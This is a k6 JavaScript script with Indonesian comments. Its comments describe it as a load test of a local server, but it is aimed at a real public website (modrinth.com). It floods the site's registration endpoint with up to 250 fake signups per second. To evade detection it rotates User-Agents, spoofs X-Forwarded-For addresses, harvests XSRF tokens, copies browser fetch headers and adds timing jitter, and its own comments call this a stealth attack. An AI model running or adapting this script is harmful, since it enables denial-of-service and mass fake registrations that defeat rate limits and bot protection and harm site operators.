import http from 'k6/http';
import { check, sleep } from 'k6';

// 1. SKENARIO AGRESIF BERGELOMBANG (Uji Beban Maksimal Server Lokal)
export const options = {
  scenarios: {
    stealth_cloud_flood: {
      executor: 'ramping-arrival-rate',
      startRate: 10,           // Detik awal: 10 pendaftaran per detik
      timeUnit: '1s',
      preAllocatedVUs: 50,     // Menyiapkan 50 Virtual Users awal di memori
      maxVUs: 800,             // Batas maksimal hingga 800 mesin paralel
      stages: [
        { duration: '30s', target: 80 },  // Naik cepat ke 80 pendaftaran/detik dalam 30 detik
        { duration: '1m', target: 250 },  // Hantaman Ekstrem: 250 pendaftaran/detik di menit pertama!
        { duration: '30s', target: 0 },   // Menurunkan trafik secara alami kembali ke nol
      ],
    },
  },
  discardResponseBodies: true, // Menghemat pemrosesan data agar performa komputer tetap maksimal
};

// Fungsi pembuat string data acak unik
function buatDataAcak(minimal, maksimal) {
  const panjang = Math.floor(Math.random() * (maksimal - minimal + 1)) + minimal;
  const karakter = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let hasil = '';
  for (let i = 0; i < panjang; i++) {
    hasil += karakter.charAt(Math.floor(Math.random() * karakter.length));
  }
  return hasil;
}

function buatNomorHp() {
  return '0813' + Math.floor(10000000 + Math.random() * 90000000);
}

// Rotasi Sidik Jari Browser (User-Agent) secara dinamis disetiap request otomatis
const listUserAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.0.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/605.1.15'
];

export default function () {
  // <--- GANTI LINK INI DENGAN ENDPOINT TARGET LOKAL ANDA (Misal: http://localhost:8080/register) --->
  const url = 'https://modrinth.com'; 

  // --- TAHAP 1: PENCURIAN TOKEN SEGAR AUTOMATIS (Pencegahan Crash) ---
  const getParams = {
    headers: {
      'User-Agent': listUserAgents[Math.floor(Math.random() * listUserAgents.length)],
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    },
    timeout: '3s', // Batasi waktu tunggu agar tidak menggantung jika server lokal mulai lambat
  };
  
  const getRes = http.get(url, getParams);
  const cookieJar = http.cookieJar();
  
  let xsrfToken = null;
  
  // PENANGANAN KESALAHAN (Error Handling): Memastikan cookieJar ada sebelum mengambil datanya
  if (cookieJar && typeof cookieJar.getCookies === 'function') {
    try {
      const cookies = cookieJar.getCookies(url);
      if (cookies && cookies['XSRF-TOKEN']) {
        xsrfToken = cookies['XSRF-TOKEN'];
      }
    } catch (e) {
      // Jika gagal mengambil cookie karena server down/timeout, abaikan dan lanjut ke tahap 2
    }
  }

  // --- TAHAP 2: EKSEKUSI PENDAFTARAN KOMPLEKS (AGRESIF) ---
  const payload = JSON.stringify({
    username: `player_${buatDataAcak(6, 10)}`,
    password: `SecurePass_${buatDataAcak(8, 12)}!`,
    password_confirmation: `SecurePass_${buatDataAcak(8, 12)}!`,
    email: `${buatDataAcak(7, 12)}@gmail.com`,
    bank: 'BCA',
    bank_account_name: `User ${buatDataAcak(5, 8).toUpperCase()}`,
    bank_account_number: buatDataAcak(10, 12),
    phone: buatNomorHp(),
    referral: 'admin',
    captcha: buatDataAcak(4, 4),
    client_token: buatDataAcak(64, 128), // Mengacak ukuran paket agar sidik jari data berubah-ubah
  });

  const postParams = {
    headers: {
      'Content-Type': 'application/json',
      'Accept': 'application/json, text/plain, */*',
      'User-Agent': listUserAgents[Math.floor(Math.random() * listUserAgents.length)],
      'Origin': 'https://modrinth.com',
      'Referer': url,
      
      // Meniru parameter navigasi manusia asli bawaan browser laptop
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-site',
      'X-Forwarded-For': `${Math.floor(Math.random() * 223) + 1}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    },
    timeout: '6s', 
    redirects: 0,
  };

  // Menyuntikkan token CSRF jika sistem web mendeteksinya
  if (xsrfToken) {
    postParams.headers['X-XSRF-TOKEN'] = decodeURIComponent(xsrfToken);
  }

  const res = http.post(url, payload, postParams);

  check(res, {
    'Tembus Ke Dalam (Status 200/302)': (r) => r.status === 200 || r.status === 302,
    'Sistem Menolak (Status 401/429/405)': (r) => r.status === 401 || r.status === 429 || r.status === 405,
    'Server Tumbang (Status 500/502/504)': (r) => r.status === 500 || r.status === 502 || r.status === 504,
  });

  // Jeda acak milidetik (Jitter) agar ritme serangan tidak kaku seperti robot biasa
  sleep(Math.random() * 0.3 + 0.05);
}
